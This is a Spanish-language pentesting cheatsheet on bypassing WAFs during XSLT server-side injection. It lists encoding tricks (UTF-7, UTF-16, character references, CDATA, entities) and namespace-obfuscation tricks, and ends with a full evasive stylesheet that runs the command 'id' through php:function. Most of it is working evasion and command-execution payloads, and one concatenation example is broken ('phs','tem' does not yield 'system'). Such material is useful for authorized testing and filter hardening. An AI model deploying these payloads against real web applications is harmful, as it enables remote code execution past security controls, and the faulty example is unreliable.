---
aliases:
  - XSLT Bypass
  - XSLT WAF Evasion
  - XSLT Encoding Tricks
tags:
  - type/cheatsheet
  - vuln/xslt-injection
  - technique/evasion
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - >-
    [[eXtensible Stylesheet Language Transformations (XSLT) Server-Side
    Injection]]
---
# XSLT - Bypasses y Evasión

***

## Encoding (UTF-16 / UTF-7 / Otros)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| UTF-16 BE BOM | `0xFE 0xFF` + stylesheet en UTF-16 | Muchos WAFs solo escanean ASCII/UTF-8 — UTF-16 los evade. |
| UTF-16 LE BOM | `0xFF 0xFE` + stylesheet en UTF-16 | Variante little-endian. |
| Declaración explícita | `<?xml version="1.0" encoding="UTF-16"?>` | Force el parser a UTF-16. |
| UTF-7 | `<?xml version="1.0" encoding="UTF-7"?>` + payload UTF-7 (`+ADw-` → `<`) | Encoding raro — la mayoría de WAFs no lo entienden. |
| UTF-32 | `<?xml version="1.0" encoding="UTF-32"?>` | Igual de evasivo, menos soportado. |
| Numeric character refs | `&#x3c;xsl:value-of select=&#x22;'pwn'&#x22;/&#x3e;` | Cada char como `&#xNN;` — válido XML. |
| Decimal char refs | `&#60;xsl:value-of select=&#34;'pwn'&#34;/&#62;` | Igual pero decimal. |
| Mezcla parcial | `<xsl:value-of select="'&#112;wn'"/>` | Solo algunos chars encoded — bypass de regex parcial. |
| CDATA wrap | `<![CDATA[<xsl:value-of select="..."/>]]>` | Esconde dentro de CDATA — algunos WAFs no descienden. |
| Entity reference | `<!DOCTYPE x [<!ENTITY p "<xsl:value-of select='1'/>">]><out>&p;</out>` | Payload via entity expansion. |
^xslt-bypass-encoding

### Stylesheet completo UTF-7

```
<?xml version="1.0" encoding="UTF-7"?>
+ADw-xsl:stylesheet version+AD0AIg-1.0+ACI- xmlns:xsl+AD0AIg-http://www.w3.org/1999/XSL/Transform+ACI-+AD4-
+ADw-xsl:template match+AD0AIg-/+ACIAPg-
+ADw-xsl:value-of select+AD0AIg-system-property('xsl:vendor')+ACIAPg-
+ADw-/xsl:template+AD4-
+ADw-/xsl:stylesheet+AD4-
```

___

## Namespaces Alternativos / Ofuscación

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Prefix custom | `xmlns:foo="http://www.w3.org/1999/XSL/Transform"` + `<foo:value-of .../>` | Cambiar `xsl:` por cualquier otro prefijo. |
| Default namespace | `<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform">` | Sin prefijo — `<value-of .../>`. |
| Mayúsculas/minúsculas | XSLT tag names case-sensitive — pero atributos NO siempre | Probar variaciones. |
| Namespace duplicado | `xmlns:xsl="..." xmlns:y="..."` ambos apuntando al mismo URI | Algunos WAFs solo bloquean `xsl:`. |
| Whitespace en atributos | `<xsl:value-of    select  =   "'x'"  />` | Tabs / saltos / espacios extras. |
| Comentarios fragmentando | `<xsl:value<!--x-->-of select="'x'"/>` — INVÁLIDO en realidad | XML no permite comentarios dentro de tags. |
| Comentarios entre nodos | `<!-- bypass --><xsl:value-of .../>` | Válido — útil para fragmentar regex multiline. |
| Atributos en orden raro | `<xsl:value-of disable-output-escaping="yes" select="'x'"/>` | Reordenar atributos. |
| Stylesheet sin XML decl | Omitir `<?xml ... ?>` | Algunos WAFs solo escanean si ven la decl. |
| Php namespace alternativo | `xmlns:p="http://php.net/xsl"` (en vez de `php:`) | Mismo URI, prefix distinto. |
| Java namespace alterno | `xmlns:R="java:java.lang.Runtime"` (en vez de `Runtime:`) | Prefix arbitrario. |
| Concatenación dinámica | `<xsl:value-of select="concat('phs','tem')"/>` (en vez de `'system'`) | Para passthrough a `php:function(...)` |
| URL-encode en select | `<xsl:value-of select="php:function('%73ystem','id')"/>` | XSLT no decodea URL — solo bypass si WAF decodifica antes. |
^xslt-bypass-namespaces

### Bypass de regex por reordenamiento

WAFs típicos buscan strings literales (`xsl:value-of`, `php:function`, `system`). Combinar:

1. Cambiar prefix → no matchea `xsl:value-of`.
2. Concat dinámico → no matchea `php:function('system'`.
3. Encoding parcial → no matchea regex char-by-char.
4. Comentarios entre tags → fragmenta líneas que el regex espera contiguas.

Stylesheet evasivo:

```xml
<?xml version="1.0" encoding="UTF-16"?>
<x:stylesheet xmlns:x="http://www.w3.org/1999/XSL/Transform"
              xmlns:p="http://php.net/xsl"
              version="1.0">
  <!-- benign -->
  <x:template match="/">
    <!-- benign -->
    <x:value-of select="p:function(concat('sys','tem'),'id')"/>
  </x:template>
</x:stylesheet>
```

***
